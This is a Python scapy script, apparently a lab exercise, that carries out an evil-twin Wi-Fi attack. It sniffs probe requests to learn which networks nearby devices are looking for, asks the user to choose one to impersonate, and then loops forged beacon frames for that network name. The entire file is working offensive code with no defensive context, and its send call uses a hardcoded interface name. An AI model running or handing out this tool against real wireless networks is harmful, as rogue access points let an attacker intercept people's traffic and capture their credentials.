import argparse

import netifaces
from scapy.all import *
# Args parsing
from scapy.layers.dot11 import Dot11ProbeReq, Dot11Beacon, Dot11, Dot11Elt, RadioTap

parser = argparse.ArgumentParser(prog="Scapy Fake channel Evil Tween attack",
                                 usage="evil_twin_probe_request.py -i wlp2s0mon -b 00:11:22:33:44:55",
                                 allow_abbrev=False)

parser.add_argument("-i", "--Interface", required=True,
                    help="The interface that you want to use, needs to be set to monitor mode")
parser.add_argument("-b", "--BSSID", required=False,
                    help="The BSSID of the AP for the new network (Will default to interface's mac if not specified)",
                    default="")

args = parser.parse_args()

SSIDs = []


def packetHandler(p):
    """
        Packet handler to analyse packet and store active detection packets
        :param p: the packet to analyse
        """
    if p.haslayer(Dot11ProbeReq) and p.info.decode("utf-8") not in SSIDs:
        SSIDs.append(p.info.decode("utf-8"))
        displaySSID(p.info.decode("utf-8"))


def displaySSID(ssid):
    """
    Display information about the ssid detected in the probe request
    :param ssid: the ssid found
    """
    print("{:03d}) {:-43}".format(len(SSIDs) - 1, ssid))
    print("Press CTRL+C to stop scanning, and select target", end="\r")


def sniff_(e):
    sniff(iface=args.Interface, prn=packetHandler, stop_filter=lambda p: e.is_set())


def detect_probe_request():
    """
        Detect AP based on probe request and display a list of requested networks
    """
    print("List of SSID requested :")

    e = threading.Event()
    t = threading.Thread(target=sniff_, args=(e,))
    t.start()

    try:
        while True:
            time.sleep(1)
    except (KeyboardInterrupt, SystemExit):
        e.set()

        while t.is_alive():
            t.join(1)


def select_ssid():
    """
        Ask the user to select a ssid in the list
        :return:  the id selected -1 if list is empty
    """
    ssid_index = -1
    if len(SSIDs) == 0:
        return ssid_index
    while 0 > ssid_index or len(SSIDs) - 1 < ssid_index:
        try:
            ssid_index = int(input(
                "\nPlease Select the number associated with the network you wish to impersonate [0-{:d}] : ".format(
                    len(SSIDs) - 1)))
        except ValueError:
            print("Invalid input")
    return ssid_index


def fake_network(ssid):
    interface = netifaces.ifaddresses(args.Interface)[netifaces.AF_LINK]

    # Set given BSSID or use default
    dot11 = Dot11(type=0, subtype=8, addr1=interface[0]['broadcast'], addr2=interface[0]['addr'],
                  addr3=interface[0]['addr'] if not args.BSSID else args.BSSID)

    beacon = Dot11Beacon(cap='ESS+privacy')

    essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))

    # Force specific channel because it should not matter too much
    channel = Dot11Elt(ID='DSset', info=chr(11))

    frame = RadioTap() / dot11 / beacon / essid / channel

    frame.show()

    sendp(frame, iface="wlan0mon", inter=0.100, loop=1)


detect_probe_request()
selected_id = select_ssid()
if selected_id == -1:
    print("No AP detected. Exiting...")
    exit()

fake_network(SSIDs[selected_id])
